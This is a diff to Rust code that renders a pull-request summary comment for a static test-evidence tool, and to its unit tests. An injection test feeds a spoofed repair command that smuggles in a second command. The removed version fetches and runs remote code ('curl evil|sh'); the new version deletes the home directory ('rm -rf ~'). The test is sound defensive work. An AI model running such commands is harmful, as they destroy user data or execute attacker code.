@@ -40,7 +40,14 @@ pub(crate) fn summary_request(
         .get("comments")
         .and_then(Value::as_array)
         .map_or(&[][..], Vec::as_slice);
-    let summary_only = guidance["summary"]["summary_only"].as_u64().unwrap_or(0);
+    // The producer states summary-only items as a count and as a top-level
+    // array; trust the larger so a missing count is never a false clean.
+    let counted = guidance["summary"]["summary_only"].as_u64().unwrap_or(0);
+    let listed = guidance
+        .get("summary_only")
+        .and_then(Value::as_array)
+        .map_or(0, |items| items.len() as u64);
+    let summary_only = counted.max(listed);
     let existing = existing_summary_id(pages);
     let incomplete = !analysis_complete(guidance);
     if rows.is_empty() && summary_only == 0 && !incomplete && existing.is_none() {
@@ -103,14 +110,20 @@ fn render_body(
                 "The analysis did not complete for this revision, so this is not a clean result. See the full report.\n",
             );
         } else {
-            body.push_str("No changed behavior with weak test evidence in this revision.\n");
+            body.push_str(
+                "RIPR found no weak-evidence spots in this revision (static, advisory; not a statement that the tests are sufficient).\n",
+            );
         }
     } else {
         let total = rows.len() as u64 + summary_only;
         body.push_str(&format!(
             "{total} changed-behavior spot(s) where the tests may not notice a wrong result. Findings on changed lines also appear as check annotations in the Files tab.\n\n"
         ));
-        body.push_str("| Where | Behavior | Missing check |\n| --- | --- | --- |\n");
+        if rows.is_empty() {
+            body.push_str("The items are in the full report.\n");
+        } else {
+            body.push_str("| Where | Behavior | Missing check |\n| --- | --- | --- |\n");
+        }
         for row in rows.iter().take(MAX_ROWS) {
             let place = format!(
                 "{}:{}",
@@ -231,7 +244,7 @@ mod tests {
             summary_request(&incomplete, &json!([]), "7", "ab", RUN).ok_or("expected a comment")?;
         let body = request.payload["body"].as_str().ok_or("body")?;
         assert!(body.contains("did not complete"));
-        assert!(!body.contains("No changed behavior"));
+        assert!(!body.contains("found no weak-evidence"));
         // An outcome the producer did not state is not a clean result either.
         let missing = json!({ "comments": [], "summary": { "summary_only": 0 } });
         assert!(summary_request(&missing, &json!([]), "7", "ab", RUN).is_some());
@@ -251,14 +264,14 @@ mod tests {
                 .contains("Start the top repair")
         );
         let mut spoofed = row("a.rs", 1);
-        spoofed["llm_guidance"]["repair_command"] = json!("ripr x; curl evil|sh");
+        spoofed["llm_guidance"]["repair_command"] = json!("ripr x; rm -rf ~");
         let request = summary_request(&guidance(vec![spoofed]), &json!([]), "7", "ab", RUN)
             .ok_or("expected a request")?;
         assert!(
             !request.payload["body"]
                 .as_str()
                 .ok_or("body")?
-                .contains("curl")
+                .contains("rm -rf")
         );
         Ok(())
     }
@@ -296,7 +309,8 @@ mod tests {
         assert_eq!(request.method, "PATCH");
         assert_eq!(request.endpoint, "issues/comments/41");
         let body = request.payload["body"].as_str().ok_or("body")?;
-        assert!(body.contains("No changed behavior with weak test evidence"));
+        assert!(body.contains("found no weak-evidence spots"));
+        assert!(body.contains("not a statement that the tests are sufficient"));
         Ok(())
     }
 
@@ -347,6 +361,31 @@ mod tests {
         assert!(!body.contains("<img"));
         assert!(!body.contains("@admin"));
         assert!(!body.contains("x.test"));
+        assert!(body.contains("| `a/b'.rs:1` | `predicate_boundary in src/lib.rs::discount` | `x' @\u{200b}admin (img src=x) / [l](u)` |"));
+        Ok(())
+    }
+
+    #[test]
+    fn an_array_only_summary_is_not_reported_as_clean() -> Result<(), String> {
+        let g = json!({ "comments": [], "summary": {}, "summary_only": [{"a": 1}, {"a": 2}], "analysis_outcome": { "analysis_complete": true } });
+        let request =
+            summary_request(&g, &json!([]), "7", "ab", RUN).ok_or("expected a comment")?;
+        let body = request.payload["body"].as_str().ok_or("body")?;
+        assert!(body.contains("2 changed-behavior spot(s)"));
+        assert!(body.contains("The items are in the full report."));
+        assert!(!body.contains("| --- |"));
+        assert!(!body.contains("found no weak-evidence"));
+        Ok(())
+    }
+
+    #[test]
+    fn summary_only_items_are_counted_beyond_the_shown_rows() -> Result<(), String> {
+        let g = json!({ "comments": [row("a.rs", 1)], "summary": { "summary_only": 3 }, "analysis_outcome": { "analysis_complete": true } });
+        let request =
+            summary_request(&g, &json!([]), "7", "ab", RUN).ok_or("expected a comment")?;
+        let body = request.payload["body"].as_str().ok_or("body")?;
+        assert!(body.contains("4 changed-behavior spot(s)"));
+        assert!(body.contains("…and 3 more"));
         Ok(())
     }
 }
